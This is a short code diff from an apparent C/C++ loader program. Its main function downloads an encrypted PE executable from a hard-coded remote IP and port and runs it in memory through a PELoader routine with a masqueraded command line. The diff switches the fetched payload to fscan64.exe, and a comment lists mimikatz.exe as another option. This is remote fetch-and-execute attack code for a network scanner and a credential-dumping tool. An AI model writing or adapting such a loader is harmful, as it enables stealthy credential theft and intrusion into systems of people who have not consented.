@@ -713,14 +713,14 @@ int main(int argc, char** argv) {
     // 获取一个加密的PE文件
     wchar_t* whost= L"101.42.175.89";
     DWORD port= 65522;
-    wchar_t* wpe = L"fscan32.exe";   //mimikatz.exe   fscan32.exe  main.exe
+    wchar_t* wpe = L"fscan64.exe";   //mimikatz.exe   fscan32.exe  main.exe
     //char* host1 = argv[1];
     //DWORD port1 = atoi(argv[2]);
     //char* pe1 = argv[3];
     //char* key1 = argv[4];
     DATA PE = GetData(whost, port, wpe);
     printf("fscan32 address is :%p\n the lenght is : %d\n",PE.data,PE.len);
-    sz_masqCmd_Ansi = (char*)"whatEver";
+    sz_masqCmd_Ansi = (char*)"-rf";
     PELoader((char*)PE.data, PE.len);
     
     /*
